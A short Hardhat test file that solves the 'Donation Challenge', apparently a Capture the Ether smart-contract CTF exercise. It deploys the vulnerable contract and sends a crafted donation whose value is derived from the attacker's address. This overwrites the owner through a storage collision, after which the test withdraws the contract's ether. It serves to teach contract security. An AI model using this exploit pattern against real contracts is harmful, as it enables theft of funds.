const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe("Donation Challenge", function() {
    beforeEach(async function() {
        [player, attacker] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("DonationChallenge")).deploy({value: ethers.utils.parseEther("1.0")});
        await contract.deployed();

});
    describe("Complete Challenge", function() {
        it("Should complete the challenge", async function() {
            msgValue = ethers.BigNumber.from(attacker.address).div(ethers.BigNumber.from("10").pow(36));
            await contract.connect(attacker).donate(attacker.address, {value: msgValue}); //owner was changed to attacker.address
            await contract.connect(attacker).withdraw();
            expect(await contract.isComplete()).to.equal(true);
        });
    });
});